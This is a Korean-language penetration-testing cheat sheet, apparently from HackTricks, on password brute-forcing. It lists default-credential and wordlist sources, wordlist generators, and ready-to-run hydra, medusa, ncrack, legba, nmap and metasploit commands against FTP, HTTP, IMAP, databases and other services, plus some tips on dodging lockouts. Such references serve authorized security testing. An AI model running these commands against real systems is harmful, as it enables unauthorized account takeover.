# 브루트 포스 - 치트시트

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 사용하여 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

## 기본 자격 증명

사용 중인 기술의 기본 자격 증명을 구글에서 검색하거나 다음 링크를 시도하세요:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **사용자 정의 사전 만들기**

대상에 대한 가능한 많은 정보를 찾아 사용자 정의 사전을 생성하세요. 도움이 될 수 있는 도구:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl은 웹 사이트에서 유용한 정보를 수집하기 위해 사용되는 도구입니다. 이 도구는 웹 사이트의 콘텐츠를 스크랩하고, 단어를 추출하고, 사전 공격에 사용할 수 있는 사용자 지정 단어 목록을 생성합니다. Cewl은 웹 사이트의 콘텐츠를 분석하여 사전 공격에 사용할 수 있는 가능한 비밀번호를 생성하는 데 도움이 됩니다.

Cewl을 사용하려면 다음 명령을 실행하십시오:

```
cewl [옵션] <URL>
```

여기서 `[옵션]`은 Cewl 도구에 대한 추가 설정을 제공하는 데 사용되며, `<URL>`은 스크랩할 웹 사이트의 URL입니다. Cewl은 기본적으로 웹 사이트의 콘텐츠를 스크랩하고 단어를 추출하여 사용자 정의 단어 목록을 생성합니다.

Cewl을 사용하여 생성된 단어 목록은 다른 사전 공격 도구와 함께 사용할 수 있습니다. 이를 통해 암호를 더 쉽게 추측할 수 있으며, 웹 사이트에 대한 암호 공격을 수행할 때 유용합니다.

Cewl은 웹 사이트의 콘텐츠를 분석하여 유용한 정보를 수집하는 데 도움이 되는 강력한 도구입니다. 이를 통해 사전 공격에 사용할 수 있는 가능한 비밀번호를 생성할 수 있으며, 웹 사이트의 취약점을 찾는 데 도움이 됩니다.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

피해자에 대한 지식(이름, 날짜 등)을 기반으로 암호를 생성합니다.
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister는 단어 목록 생성 도구로, 특정 대상과 관련하여 사용할 수 있는 독특하고 이상적인 단어 목록을 생성하기 위해 주어진 단어 집합을 제공할 수 있습니다.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 워드리스트

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**할 수 있습니다.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 서비스

서비스 이름별로 알파벳순으로 정렬됩니다.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol)는 웹 서버와 웹 애플리케이션 서버 간의 통신을 위한 프로토콜입니다. AJP는 HTTP와 유사한 기능을 제공하지만, 더욱 효율적인 데이터 전송을 가능하게 합니다.

AJP를 이용한 공격은 주로 브루트 포스 공격에 사용됩니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 인증 정보를 추측하는 공격입니다. AJP는 인증 정보를 전송하는 데 사용되므로, 악의적인 사용자가 AJP를 통해 인증 정보를 추측하여 시스템에 접근할 수 있습니다.

AJP 브루트 포스 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호 정책을 설정하여 암호의 복잡성을 강화합니다.
- 계정 잠금 정책을 설정하여 일정 횟수 이상의 실패한 로그인 시도로부터 계정을 보호합니다.
- 인증 시스템에 2단계 인증을 구현하여 보안을 강화합니다.
- AJP를 사용하지 않도록 웹 서버 및 웹 애플리케이션 서버를 구성합니다.

AJP 브루트 포스 공격은 악의적인 사용자가 시스템에 접근하여 중요한 정보를 탈취하거나 악용할 수 있는 위험을 초래할 수 있으므로, 이에 대한 보호 조치를 적극적으로 시행해야 합니다.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

AMQP (Advanced Message Queuing Protocol)은 메시지 지향 미들웨어를 위한 개방형 표준 프로토콜입니다. AMQP는 다양한 메시징 브로커를 지원하며, 그 중에서도 ActiveMQ, RabbitMQ, Qpid, JORAM, Solace 등이 주로 사용됩니다.

### Brute Forcing AMQP

AMQP 브로커에 대한 브루트 포스 공격은 다양한 방법으로 수행될 수 있습니다. 일반적으로 사용되는 방법은 다음과 같습니다.

1. **사전 공격**: 일반적으로 사용되는 사용자 이름과 비밀번호 조합을 사용하여 AMQP 브로커에 대한 브루트 포스 공격을 시도합니다. 이를 위해 사전 공격 도구인 Hydra, Medusa 등을 사용할 수 있습니다.

2. **사용자 이름 브루트 포스**: AMQP 브로커에 대한 사용자 이름을 브루트 포스 공격하여 유효한 사용자 이름을 찾을 수 있습니다. 이를 위해 Burp Suite, wfuzz 등의 도구를 사용할 수 있습니다.

3. **비밀번호 브루트 포스**: AMQP 브로커에 대한 비밀번호를 브루트 포스 공격하여 올바른 비밀번호를 찾을 수 있습니다. 이를 위해 Hydra, Medusa, Ncrack 등의 도구를 사용할 수 있습니다.

4. **기본 자격 증명**: AMQP 브로커의 기본 자격 증명을 사용하여 로그인을 시도할 수 있습니다. 일부 AMQP 브로커는 기본적으로 "guest"와 "guest"라는 사용자 이름과 비밀번호를 사용합니다.

5. **사회 공학**: 사회 공학 기법을 사용하여 AMQP 브로커에 대한 로그인 자격 증명을 획득할 수 있습니다. 이를 위해 피싱, 소셜 엔지니어링, 사회 공학 툴킷 등을 사용할 수 있습니다.

### AMQP 브로커 보안 강화

AMQP 브로커의 보안을 강화하기 위해 다음과 같은 조치를 취할 수 있습니다.

1. **강력한 자격 증명**: AMQP 브로커에 대한 로그인 자격 증명으로 강력한 비밀번호를 사용하고, 기본 자격 증명을 비활성화합니다.

2. **계정 잠금**: 일정 횟수의 실패한 로그인 시도 후에는 계정을 일시적으로 잠금 상태로 전환합니다.

3. **IP 제한**: 특정 IP 주소에서만 AMQP 브로커에 접근할 수 있도록 IP 제한을 설정합니다.

4. **TLS/SSL 사용**: AMQP 통신을 암호화하기 위해 TLS/SSL을 사용합니다.

5. **강력한 액세스 제어**: AMQP 브로커에 대한 액세스 제어를 구성하여 필요한 권한만을 가진 사용자만이 브로커에 접근할 수 있도록 합니다.

6. **로그 모니터링**: AMQP 브로커의 로그를 모니터링하여 이상한 활동을 탐지하고 대응합니다.

7. **정기적인 업데이트**: AMQP 브로커를 최신 버전으로 업데이트하여 보안 취약점을 해결합니다.

이러한 조치를 통해 AMQP 브로커의 보안을 강화할 수 있습니다.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### 카산드라

Cassandra는 분산형 NoSQL 데이터베이스 시스템으로, 대량의 데이터를 처리하고 확장할 수 있는 기능을 제공합니다. 이 시스템은 다중 마스터 아키텍처를 사용하여 고가용성과 내결함성을 보장합니다. 카산드라는 Apache Cassandra 프로젝트의 일부로 개발되었으며, Facebook에서 처음으로 개발되었습니다.

카산드라는 키-값 저장소 모델을 사용하며, 데이터는 여러 노드에 분산되어 저장됩니다. 이러한 분산 저장 방식은 데이터의 가용성과 성능을 향상시킵니다. 또한, 카산드라는 자동 파티셔닝 기능을 제공하여 데이터의 규모를 확장할 수 있습니다.

카산드라는 다양한 보안 기능을 제공하여 데이터의 안전성을 보장합니다. 예를 들어, 데이터 암호화, 사용자 인증 및 접근 제어, 네트워크 보안 등의 기능을 제공합니다.

카산드라는 대규모 데이터 처리 및 분석에 적합한 시스템입니다. 그러나 이러한 기능을 제공하기 위해서는 적절한 구성과 관리가 필요합니다. 따라서, 카산드라 시스템을 사용하는 경우 적절한 보안 조치와 모니터링이 필요합니다.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB는 Apache Software Foundation에서 개발한 오픈 소스 문서 지향 NoSQL 데이터베이스입니다. CouchDB는 JSON 형식으로 데이터를 저장하고, RESTful API를 통해 데이터에 접근할 수 있습니다. 이 데이터베이스는 분산 아키텍처를 지원하며, 데이터의 복제와 동기화를 쉽게 처리할 수 있습니다.

CouchDB에 대한 브루트 포스 공격은 다양한 방법으로 수행될 수 있습니다. 일반적으로는 관리자 계정의 암호를 추측하여 로그인을 시도하는 방식으로 진행됩니다. 이를 위해 다양한 브루트 포스 도구를 사용할 수 있으며, 대부분의 도구는 대량의 암호를 자동으로 시도하여 올바른 암호를 찾는 방식으로 작동합니다.

CouchDB 브루트 포스 공격을 방지하기 위해 다음과 같은 조치를 취할 수 있습니다:

- 강력한 암호 정책을 설정하고, 사용자들에게 안전한 암호를 사용하도록 유도합니다.
- 로그인 시도 횟수 제한 기능을 활성화하여, 일정 횟수 이상의 실패한 로그인 시도를 차단합니다.
- CouchDB 서버에 대한 액세스를 제한하는 방화벽 규칙을 설정합니다.
- 최신 버전의 CouchDB를 사용하고, 보안 패치를 정기적으로 적용합니다.

브루트 포스 공격은 시간과 자원이 많이 소요되는 공격 방법이므로, 위의 조치를 통해 CouchDB의 보안을 강화할 수 있습니다.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker 레지스트리

Docker 레지스트리는 Docker 이미지를 저장하고 공유하기 위한 중앙 저장소입니다. 이 저장소는 Docker 클라이언트가 이미지를 검색하고 다운로드할 수 있는 곳입니다. Docker 레지스트리는 공개적으로 액세스 가능한 공개 레지스트리와 개인적으로 유지되는 개인 레지스트리로 나뉩니다.

#### 공개 레지스트리

공개 레지스트리는 누구나 액세스할 수 있는 공개적인 저장소입니다. Docker Hub는 가장 유명한 공개 레지스트리 중 하나입니다. Docker Hub에서는 다양한 공개 이미지를 찾을 수 있으며, 필요한 이미지를 다운로드하여 사용할 수 있습니다.

#### 개인 레지스트리

개인 레지스트리는 개인 또는 조직이 관리하는 비공개 저장소입니다. 이러한 레지스트리는 보안 및 제어 요구 사항을 충족하기 위해 사용됩니다. 개인 레지스트리는 Docker 클라이언트가 이미지를 업로드하고 다운로드할 수 있는 곳입니다. 개인 레지스트리는 Docker Hub와 같은 공개 레지스트리와는 달리 인증 및 권한 부여를 통해 액세스를 제한할 수 있습니다.

#### 레지스트리 브루트 포스 공격

레지스트리 브루트 포스 공격은 레지스트리에 대한 액세스 권한을 얻기 위해 다양한 조합의 사용자 이름과 비밀번호를 시도하는 공격입니다. 이러한 공격은 약한 인증 정보를 사용하는 사용자 계정을 찾는 데 사용될 수 있습니다. 브루트 포스 공격을 방지하기 위해 강력한 암호 정책을 사용하고, 계정 잠금 기능을 활성화하고, IP 주소 기반의 차단 기능을 구현하는 것이 중요합니다.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It is commonly used for log and event data analysis, full-text search, and real-time analytics. Elasticsearch provides a scalable and efficient solution for storing, searching, and analyzing large volumes of data.

## Brute Force Attacks

Brute force attacks are a common method used to gain unauthorized access to Elasticsearch instances. In a brute force attack, an attacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

To protect against brute force attacks, it is important to implement strong authentication mechanisms and enforce password complexity requirements. Additionally, rate limiting and account lockout policies can be implemented to prevent multiple failed login attempts.

## Tools for Brute Force Attacks

There are several tools available for conducting brute force attacks against Elasticsearch. Some popular tools include:

- **Patator**: A multi-purpose brute-forcing tool that supports various protocols, including Elasticsearch.
- **Hydra**: A powerful network login cracker that can be used for brute forcing Elasticsearch credentials.
- **Medusa**: A speedy, parallel, and modular login brute-forcer that supports Elasticsearch.

It is important to note that using these tools for unauthorized access is illegal and unethical. They should only be used for legitimate purposes, such as penetration testing or security assessments with proper authorization.

## Prevention Techniques

To prevent brute force attacks against Elasticsearch, consider implementing the following techniques:

- **Strong Passwords**: Enforce the use of strong, complex passwords that are resistant to brute force attacks.
- **Account Lockout**: Implement an account lockout policy that temporarily locks user accounts after a certain number of failed login attempts.
- **Rate Limiting**: Implement rate limiting mechanisms to restrict the number of login attempts within a specific time frame.
- **Two-Factor Authentication**: Implement two-factor authentication to add an extra layer of security to the authentication process.

By implementing these prevention techniques, you can significantly reduce the risk of unauthorized access to your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP(파일 전송 프로토콜)는 파일을 서버와 클라이언트 간에 전송하기 위한 프로토콜입니다. FTP 서버에 대한 브루트 포스 공격은 다양한 방법으로 수행될 수 있습니다.

#### 1. Dictionary Attack

사전 공격은 미리 작성된 사용자 이름과 비밀번호 목록을 사용하여 FTP 서버에 대한 인증을 시도하는 공격입니다. 이 공격은 일반적으로 많은 사용자 이름과 비밀번호 조합을 시도하기 때문에 시간이 오래 걸릴 수 있습니다. 그러나 약한 비밀번호를 사용하는 사용자에 대해서는 효과적일 수 있습니다.

#### 2. Brute Force Attack

브루트 포스 공격은 모든 가능한 조합을 시도하여 FTP 서버에 대한 인증을 시도하는 공격입니다. 이 공격은 사전 공격보다 더 많은 시간이 소요될 수 있지만, 모든 가능성을 고려하기 때문에 더 강력한 공격입니다. 그러나 이러한 공격은 대부분의 경우 효과적이지 않을 수 있습니다.

#### 3. Hydra

Hydra는 다양한 프로토콜에 대한 브루트 포스 공격을 수행하는 도구입니다. FTP 서버에 대한 브루트 포스 공격을 수행하기 위해 Hydra를 사용할 수 있습니다. Hydra는 다양한 인증 방법과 사용자 이름, 비밀번호 목록을 지원하며, 병렬로 여러 시도를 수행하여 공격 속도를 높일 수 있습니다.

#### 4. Medusa

Medusa는 다양한 프로토콜에 대한 브루트 포스 공격을 수행하는 또 다른 도구입니다. FTP 서버에 대한 브루트 포스 공격을 수행하기 위해 Medusa를 사용할 수 있습니다. Medusa는 다양한 인증 방법과 사용자 이름, 비밀번호 목록을 지원하며, 병렬로 여러 시도를 수행하여 공격 속도를 높일 수 있습니다.

#### 5. Ncrack

Ncrack은 다양한 프로토콜에 대한 브루트 포스 공격을 수행하는 도구입니다. FTP 서버에 대한 브루트 포스 공격을 수행하기 위해 Ncrack을 사용할 수 있습니다. Ncrack은 다양한 인증 방법과 사용자 이름, 비밀번호 목록을 지원하며, 병렬로 여러 시도를 수행하여 공격 속도를 높일 수 있습니다.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP 일반 무차별 대입 공격

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP 기본 인증
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM은 Windows 운영 체제에서 사용되는 인증 프로토콜입니다. NTLM은 클라이언트와 서버 간의 인증을 위해 사용되며, 주로 HTTP 프로토콜에서 사용됩니다.

NTLM 인증은 세 단계로 이루어집니다. 첫 번째 단계에서는 클라이언트가 서버에게 인증 요청을 보냅니다. 두 번째 단계에서는 서버가 클라이언트에게 랜덤한 도전 응답 값을 보냅니다. 세 번째 단계에서는 클라이언트가 도전 응답 값을 사용하여 자신을 인증합니다.

NTLM 인증을 무력화하기 위해 브루트 포스 공격을 사용할 수 있습니다. 브루트 포스 공격은 가능한 모든 비밀번호 조합을 시도하여 올바른 비밀번호를 찾는 공격입니다. 이를 위해 다양한 도구와 기술을 사용할 수 있습니다.

NTLM 브루트 포스 공격을 수행하기 위해 Hydra, Medusa, Ncrack 등의 도구를 사용할 수 있습니다. 이러한 도구는 대량의 비밀번호를 빠르게 시도하여 올바른 비밀번호를 찾을 수 있습니다.

NTLM 브루트 포스 공격을 성공적으로 수행하기 위해 몇 가지 팁을 알아두는 것이 좋습니다. 첫째, 가능한 비밀번호 조합을 최소화하기 위해 대상의 비밀번호 정책을 이해해야 합니다. 둘째, 비밀번호 사전을 사용하여 일반적인 비밀번호를 시도할 수 있습니다. 셋째, 병렬로 여러 대상에 대해 공격을 수행하여 시간을 절약할 수 있습니다.

NTLM 브루트 포스 공격은 유용한 테스트 도구이지만, 합법적인 목적으로만 사용해야 합니다. 무단으로 다른 사람의 계정을 공격하거나 비밀번호를 유출하는 행위는 불법입니다. 항상 법적인 규정을 준수하고 윤리적인 행동을 지켜야 합니다.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - 포스트 폼

포스트 폼은 웹 애플리케이션에서 사용자로부터 입력을 받아 서버로 전송하는 방법 중 하나입니다. 이는 로그인, 회원가입, 데이터 제출 등 다양한 상황에서 사용됩니다. 포스트 폼을 이용하여 브루트 포스 공격을 수행할 수 있습니다.

#### 브루트 포스 공격

브루트 포스 공격은 모든 가능한 조합을 시도하여 인증 정보를 찾는 공격입니다. 포스트 폼을 이용한 브루트 포스 공격은 다음과 같은 단계로 진행됩니다.

1. 공격 대상의 로그인 페이지를 확인합니다.
2. 로그인 폼의 필드를 식별합니다. 일반적으로는 사용자 이름과 비밀번호 필드가 있습니다.
3. 브루트 포스 스크립트를 작성하여 사용자 이름과 비밀번호를 조합하여 폼 데이터를 생성합니다.
4. 생성된 폼 데이터를 로그인 페이지로 전송합니다.
5. 응답을 분석하여 올바른 인증 정보를 찾을 때까지 반복합니다.

#### 예시

다음은 포스트 폼을 이용한 브루트 포스 공격의 예시입니다.

```html
<form action="/login" method="post">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" value="Login">
</form>
```

위의 예시에서는 사용자 이름과 비밀번호를 입력받는 폼이 있습니다. 이를 이용하여 브루트 포스 공격을 시도할 수 있습니다.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s**로 변경해야 합니다. "http-post-form"을 "**https-post-form"**으로 변경해야 합니다.

### **HTTP - CMS --** (W)ordpress, (J)oomla 또는 (D)rupal 또는 (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol)은 이메일 클라이언트가 이메일 서버와 통신하기 위해 사용하는 프로토콜입니다. IMAP은 이메일을 서버에 저장하고 관리하는 데 사용됩니다. 이 프로토콜은 이메일을 클라이언트 장치와 서버 간에 동기화하는 데 도움이 됩니다.

IMAP 브루트 포스 공격은 암호를 추측하여 이메일 계정에 무단으로 액세스하는 공격입니다. 이 공격은 대부분의 이메일 클라이언트에서 사용되는 일반적인 인증 방법을 대상으로 합니다.

IMAP 브루트 포스 공격을 수행하기 위해 다음 단계를 따를 수 있습니다:

1. 대상 이메일 서버 식별: 대상 이메일 서버의 IP 주소 또는 도메인 이름을 식별합니다.
2. 포트 스캐닝: 대상 서버의 IMAP 포트를 스캔하여 열려 있는 포트를 확인합니다. 기본적으로 IMAP은 143번 포트를 사용합니다.
3. 사용자 목록 수집: 대상 이메일 도메인에서 사용자 목록을 수집합니다.
4. 암호 추측: 수집한 사용자 목록에 대해 가능한 암호를 추측하여 브루트 포스 공격을 수행합니다.
5. 성공 시 액세스: 올바른 암호를 찾으면 이메일 계정에 액세스할 수 있습니다.

IMAP 브루트 포스 공격은 암호를 추측하는 공격이므로 강력한 암호 정책을 사용하고, 2단계 인증 등의 추가 보안 기능을 활성화하여 이메일 계정을 보호하는 것이 중요합니다.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC (Internet Relay Chat)는 인터넷을 통해 실시간으로 대화를 나눌 수 있는 프로토콜입니다. IRC는 클라이언트-서버 모델을 기반으로 하며, 사용자는 IRC 클라이언트를 사용하여 서버에 연결하고 채널에 참여할 수 있습니다.

IRC 서버에 대한 브루트 포스 공격은 다양한 방법으로 수행될 수 있습니다. 가장 일반적인 방법은 사용자 계정에 대한 암호를 무작위로 추측하여 로그인을 시도하는 것입니다. 이를 위해 다양한 도구와 기술을 사용할 수 있습니다.

브루트 포스 공격을 수행하기 전에 목표 서버에 대한 정보를 수집하는 것이 중요합니다. 이를 위해 DNS 쿼리, 포트 스캐닝, 서비스 식별 등의 기술을 사용할 수 있습니다. 또한, 서버에 대한 암호 정책을 분석하여 가능한 암호 패턴을 식별할 수도 있습니다.

브루트 포스 공격을 수행할 때는 다음과 같은 사항을 고려해야 합니다:

- 암호 추측 속도 제한: 일부 서버는 일정 시간 동안 잘못된 암호 시도를 제한하는 기능을 가지고 있습니다. 이를 피하기 위해 암호 추측 속도를 제한해야 합니다.
- 암호 목록: 가능한 암호를 포함하는 목록을 작성하여 브루트 포스 공격에 사용할 수 있습니다. 이 목록은 일반적인 암호, 사전 공격에 사용되는 암호 등을 포함해야 합니다.
- 다중 스레드: 브루트 포스 공격을 가속화하기 위해 다중 스레드를 사용할 수 있습니다. 이를 통해 동시에 여러 암호를 시도할 수 있습니다.
- 로그인 실패 감지: 일부 서버는 일정 횟수의 로그인 실패 시도 후에 일시적으로 계정을 잠금 상태로 전환하는 기능을 가지고 있습니다. 이를 피하기 위해 로그인 실패 횟수를 제한해야 합니다.

브루트 포스 공격은 시간과 자원이 많이 소요되는 공격 방법이므로, 효율적인 암호 추측 전략을 사용하는 것이 중요합니다. 가능한한 많은 정보를 수집하고, 암호 목록을 최적화하여 성공 확률을 높일 수 있습니다.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI는 IP 네트워크를 통해 SCSI 프로토콜을 사용하여 스토리지 장치에 액세스하는 데 사용되는 프로토콜입니다. iSCSI는 블록 수준의 액세스를 제공하며, 이를 통해 원격 스토리지 장치를 로컬 스토리지와 동일하게 사용할 수 있습니다.

iSCSI는 브루트 포스 공격에 취약할 수 있습니다. 브루트 포스 공격은 모든 가능한 조합을 시도하여 암호를 찾는 공격입니다. iSCSI에서는 사용자 인증을 위해 CHAP(Challenge-Handshake Authentication Protocol)을 사용하는 경우가 많습니다. 그러나 약한 암호를 사용하거나 암호를 무작위로 생성하지 않는 경우 브루트 포스 공격으로 암호를 찾을 수 있습니다.

브루트 포스 공격을 방지하기 위해 강력한 암호를 사용하고, 암호 정책을 엄격하게 시행하는 것이 중요합니다. 또한, 인증 시도 횟수를 제한하고 잠금 기능을 활성화하여 브루트 포스 공격을 방어할 수 있습니다.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Token)은 인증과 정보 교환을 위한 컴팩트하고 자가수용적인 방식을 제공하는 토큰입니다. 이 토큰은 클라이언트와 서버 간의 정보를 안전하게 전송하기 위해 사용됩니다. JWT는 세 부분으로 구성되어 있습니다: 헤더, 페이로드, 서명.

#### 헤더 (Header)

헤더는 JWT가 어떤 알고리즘을 사용하여 서명되었는지를 나타냅니다. 일반적으로는 HMAC SHA256 또는 RSA를 사용합니다.

#### 페이로드 (Payload)

페이로드는 클레임(claim)이라고도 불리는 정보를 포함합니다. 클레임은 토큰에 대한 메타데이터를 제공하며, 등록된 클레임, 공개 클레임, 비공개 클레임으로 구분됩니다.

#### 서명 (Signature)

서명은 헤더와 페이로드를 기반으로 생성되며, 서버에서만 알고 있는 비밀 키를 사용하여 생성됩니다. 이 서명은 토큰이 변조되지 않았음을 검증하는 데 사용됩니다.

JWT는 토큰 자체에 정보를 포함하고 있으므로 서버에서 상태를 유지할 필요가 없습니다. 이는 확장성과 분산 시스템에서의 사용에 매우 유용합니다.

#### JWT의 취약점

JWT의 주요 취약점 중 하나는 암호화되지 않은 토큰의 경우 토큰을 조작할 수 있다는 점입니다. 따라서 토큰을 안전하게 전송하려면 HTTPS와 같은 보안 프로토콜을 사용해야 합니다. 또한, 서버에서 토큰을 검증할 때 충분한 보안 검사를 수행해야 합니다.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
